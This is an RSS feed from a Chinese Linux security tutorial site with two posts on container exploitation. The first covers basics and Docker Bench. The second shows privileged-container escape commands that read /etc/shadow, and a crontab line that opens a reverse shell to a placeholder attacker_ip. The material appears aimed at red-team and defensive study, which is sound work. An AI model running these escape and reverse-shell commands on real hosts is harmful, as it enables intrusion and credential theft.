@@ -1,0 +1,136 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>容器漏洞利用 on Linux邪修</title><link>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</link><description>Recent content in 容器漏洞利用 on Linux邪修</description><generator>Hugo</generator><language>zh</language><copyright>© 2024 Linux邪修</copyright><atom:link href="https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>容器漏洞利用基础知识</title><link>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</guid><description>&lt;h2 id="技术介绍"&gt;技术介绍&lt;a class="anchor" href="#%e6%8a%80%e6%9c%af%e4%bb%8b%e7%bb%8d"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;容器漏洞利用是一种利用容器环境中安全漏洞的技术。攻击者通过利用容器中的漏洞，如配置错误、权限问题、未加密数据等，获取未授权访问或执行恶意操作。本教程将详细介绍容器漏洞利用的基础知识、核心概念和技术方法，帮助安全人员理解和防御容器漏洞利用攻击。&lt;/p&gt;
+&lt;h3 id="容器漏洞利用核心概念"&gt;容器漏洞利用核心概念&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%a0%b8%e5%bf%83%e6%a6%82%e5%bf%b5"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;容器（Container）&lt;/strong&gt;：容器技术&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器漏洞利用（Container Vulnerability Exploitation）&lt;/strong&gt;：利用容器安全漏洞的技术&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Docker&lt;/strong&gt;：容器平台&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Kubernetes&lt;/strong&gt;：容器编排平台&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器镜像（Container Image）&lt;/strong&gt;：容器的镜像&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器网络（Container Network）&lt;/strong&gt;：容器的网络&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器存储（Container Storage）&lt;/strong&gt;：容器的存储&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器安全（Container Security）&lt;/strong&gt;：容器的安全防护&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器漏洞（Container Vulnerability）&lt;/strong&gt;：容器的安全漏洞&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器逃逸（Container Escape）&lt;/strong&gt;：容器逃逸攻击&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器合规（Container Compliance）&lt;/strong&gt;：容器的合规性&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器网络安全（Container Network Security）&lt;/strong&gt;：容器的网络安全&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="容器漏洞利用的特点"&gt;容器漏洞利用的特点&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e7%9a%84%e7%89%b9%e7%82%b9"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;隐蔽性&lt;/strong&gt;：容器漏洞利用攻击隐蔽性强&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;灵活性&lt;/strong&gt;：容器漏洞利用技术灵活多样&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;依赖性&lt;/strong&gt;：容器漏洞利用依赖容器漏洞&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;检测难度&lt;/strong&gt;：容器漏洞利用检测难度较大&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;影响范围&lt;/strong&gt;：容器漏洞利用影响范围广&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;技术复杂&lt;/strong&gt;：容器漏洞利用技术复杂&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="容器漏洞利用的重要性"&gt;容器漏洞利用的重要性&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e7%9a%84%e9%87%8d%e8%a6%81%e6%80%a7"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;攻击检测&lt;/strong&gt;：检测容器漏洞利用攻击&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;系统加固&lt;/strong&gt;：加固系统防止容器漏洞利用&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;安全防护&lt;/strong&gt;：防护容器漏洞利用攻击&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;合规性&lt;/strong&gt;：满足合规性要求&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;风险降低&lt;/strong&gt;：降低安全风险&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器保护&lt;/strong&gt;：保护容器安全&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="技术体系"&gt;技术体系&lt;a class="anchor" href="#%e6%8a%80%e6%9c%af%e4%bd%93%e7%b3%bb"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;容器漏洞利用技术体系主要包括以下几个方面：&lt;/p&gt;
+&lt;h3 id="容器漏洞利用原理"&gt;容器漏洞利用原理&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;容器架构&lt;/strong&gt;：容器的架构和组件&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器网络&lt;/strong&gt;：容器的网络架构&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器存储&lt;/strong&gt;：容器的存储架构&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器认证机制&lt;/strong&gt;：容器的认证机制&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器授权机制&lt;/strong&gt;：容器的授权机制&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器漏洞类型&lt;/strong&gt;：容器的漏洞类型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="容器漏洞利用技术"&gt;容器漏洞利用技术&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%8a%80%e6%9c%af"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;容器逃逸利用&lt;/strong&gt;：利用容器逃逸漏洞&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器配置利用&lt;/strong&gt;：利用容器配置错误&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器权限利用&lt;/strong&gt;：利用容器权限问题&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器网络利用&lt;/strong&gt;：利用容器网络漏洞&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器镜像利用&lt;/strong&gt;：利用容器镜像漏洞&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="容器漏洞利用防御"&gt;容器漏洞利用防御&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e9%98%b2%e5%be%a1"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;容器监控&lt;/strong&gt;：监控容器活动&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器配置加固&lt;/strong&gt;：加固容器配置&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器权限管理&lt;/strong&gt;：管理容器权限&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器网络隔离&lt;/strong&gt;：隔离容器网络&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;容器镜像扫描&lt;/strong&gt;：扫描容器镜像&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="工具使用"&gt;工具使用&lt;a class="anchor" href="#%e5%b7%a5%e5%85%b7%e4%bd%bf%e7%94%a8"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id="容器漏洞利用检测工具"&gt;容器漏洞利用检测工具&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%a3%80%e6%b5%8b%e5%b7%a5%e5%85%b7"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Docker Bench&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：Docker安全检查工具&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;用途&lt;/strong&gt;：检查Docker安全配置&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;使用方法&lt;/strong&gt;：
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 安装Docker Bench&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;git clone https://github.com/docker/docker-bench-security.git
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ff5c57"&gt;cd&lt;/span&gt; docker-bench-security
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 运行Docker Bench&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo sh docker-bench-security.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 查看检查结果&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 分析Docker安全配置&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 修复安全问题&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Trivy&lt;/strong&gt;：&lt;/p&gt;</description></item><item><title>容器漏洞利用技术</title><link>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://linuxiexiu.github.io/docs/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/</guid><description>&lt;h1 id="容器漏洞利用技术"&gt;容器漏洞利用技术&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%8a%80%e6%9c%af"&gt;#&lt;/a&gt;&lt;/h1&gt;
+&lt;h2 id="技术介绍"&gt;技术介绍&lt;a class="anchor" href="#%e6%8a%80%e6%9c%af%e4%bb%8b%e7%bb%8d"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;容器漏洞利用是指利用容器技术中的安全漏洞，实现容器逃逸、权限提升、横向移动等攻击目标。随着容器技术的广泛应用，容器漏洞利用已成为红队攻击和蓝队防御的重要技术领域。&lt;/p&gt;
+&lt;h3 id="主要漏洞利用技术"&gt;主要漏洞利用技术&lt;a class="anchor" href="#%e4%b8%bb%e8%a6%81%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%8a%80%e6%9c%af"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;容器逃逸漏洞利用&lt;/li&gt;
+&lt;li&gt;容器配置错误利用&lt;/li&gt;
+&lt;li&gt;容器运行时漏洞利用&lt;/li&gt;
+&lt;li&gt;容器镜像漏洞利用&lt;/li&gt;
+&lt;li&gt;容器编排系统漏洞利用&lt;/li&gt;
+&lt;li&gt;容器网络漏洞利用&lt;/li&gt;
+&lt;li&gt;容器存储漏洞利用&lt;/li&gt;
+&lt;li&gt;容器API漏洞利用&lt;/li&gt;
+&lt;li&gt;容器供应链漏洞利用&lt;/li&gt;
+&lt;li&gt;容器内核漏洞利用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="适用场景"&gt;适用场景&lt;a class="anchor" href="#%e9%80%82%e7%94%a8%e5%9c%ba%e6%99%af"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;红队攻击和渗透测试&lt;/li&gt;
+&lt;li&gt;容器安全评估&lt;/li&gt;
+&lt;li&gt;容器环境安全研究&lt;/li&gt;
+&lt;li&gt;云原生安全测试&lt;/li&gt;
+&lt;li&gt;容器平台安全审计&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="入门级使用"&gt;入门级使用&lt;a class="anchor" href="#%e5%85%a5%e9%97%a8%e7%ba%a7%e4%bd%bf%e7%94%a8"&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id="特权容器逃逸"&gt;特权容器逃逸&lt;a class="anchor" href="#%e7%89%b9%e6%9d%83%e5%ae%b9%e5%99%a8%e9%80%83%e9%80%b8"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;利用特权容器实现容器逃逸：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 检查容器是否为特权容器&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker inspect container_name | grep Privileged
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 如果容器是特权容器，可以逃逸到主机&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker &lt;span style="color:#ff5c57"&gt;exec&lt;/span&gt; -it container_name /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 挂载主机文件系统&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;mount /dev/sda1 /mnt
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;chroot /mnt
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 现在可以完全控制主机系统&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ls -la /mnt/etc/
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cat /mnt/etc/shadow&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="容器卷挂载利用"&gt;容器卷挂载利用&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8%e5%8d%b7%e6%8c%82%e8%bd%bd%e5%88%a9%e7%94%a8"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;利用容器卷挂载实现容器逃逸：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 检查容器卷挂载&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker inspect container_name | grep -A &lt;span style="color:#ff9f43"&gt;20&lt;/span&gt; Mounts
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 如果容器挂载了主机目录，可以访问主机文件系统&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;docker &lt;span style="color:#ff5c57"&gt;exec&lt;/span&gt; -it container_name /bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ff5c57"&gt;cd&lt;/span&gt; /host
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ls -la
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#78787e"&gt;# 修改主机系统文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#ff5c57"&gt;echo&lt;/span&gt; &lt;span style="color:#5af78e"&gt;&amp;#39;* * * * * root /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/attacker_ip/4444 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /host/etc/crontab&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="容器docker-socket挂载利用"&gt;容器Docker Socket挂载利用&lt;a class="anchor" href="#%e5%ae%b9%e5%99%a8docker-socket%e6%8c%82%e8%bd%bd%e5%88%a9%e7%94%a8"&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;利用Docker Socket挂载实现容器逃逸：&lt;/p&gt;</description></item></channel></rss>
